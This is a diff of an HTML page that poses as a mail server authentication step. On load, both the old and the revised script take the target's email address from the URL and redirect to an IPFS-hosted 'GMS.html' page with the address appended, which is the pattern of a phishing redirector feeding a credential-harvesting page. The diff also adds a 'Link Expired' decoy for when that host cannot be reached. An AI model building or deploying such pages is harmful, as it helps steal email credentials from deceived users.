@@ -1,49 +1,38 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
   <head>
-    <title>Connecting Mail Server...</title>
+    <meta charset="UTF-8" />
+    <title>AUTHENTICATING Mail SERVER...</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        margin-top: 50px;
+      }
+    </style>
     <script>
-      // This function will extract the email from the URL (works in IE)
-      function getEmailFromUrl() {
-        var email = "{email}"; // Default to placeholder if no email is found
-        
-        // Get the query string from the URL
-        var queryString = window.location.search;
-        
-        // Check if there is an email parameter in the query string
-        if (queryString.indexOf('email=') !== -1) {
-          var params = queryString.substring(1).split('&'); // Get parameters
-          
-          // Loop through parameters and find email
-          for (var i = 0; i < params.length; i++) {
-            var param = params[i].split('=');
-            if (param[0] === 'email') {
-              email = decodeURIComponent(param[1]); // Use the email value
-              break;
-            }
-          }
+      async function checkAndRedirect() {
+        const params = new URLSearchParams(window.location.search);
+        const email = params.get("email") || "unknown@example.com";
+        const encodedEmail = encodeURIComponent(email);
+
+        const ipfsURL = `https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#${encodedEmail}`;
+
+        try {
+          // Check if IPFS page is reachable
+          const response = await fetch(ipfsURL, { method: 'HEAD', mode: 'no-cors' });
+          // Redirect anyway; fetch with no-cors won't throw unless completely unreachable
+          window.location.href = ipfsURL;
+        } catch (error) {
+          // Show "Link Expired" if it fails
+          document.body.innerHTML = `<h1>Link Expired</h1><p>The page is no longer available.</p>`;
         }
-        
-        return email;
       }
 
-      // This function will redirect immediately to the target URL with the email
-      function redirectToTarget() {
-        // Get the email from URL or fallback
-        var email = getEmailFromUrl();
-
-        // Define your redirect URL using the email parameter
-        var redirectUrl = 'https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#' + email;
-
-        // Redirect immediately to the new URL
-        window.location.replace(redirectUrl);
-      }
-
-      // Call the redirect function when the page loads
-      window.onload = redirectToTarget;
+      window.onload = checkAndRedirect;
     </script>
   </head>
   <body>
-    <p>AUTHENTICATING, please wait...</p>
+    <p>AUTHENTICATING SERVER...</p>
   </body>
 </html>
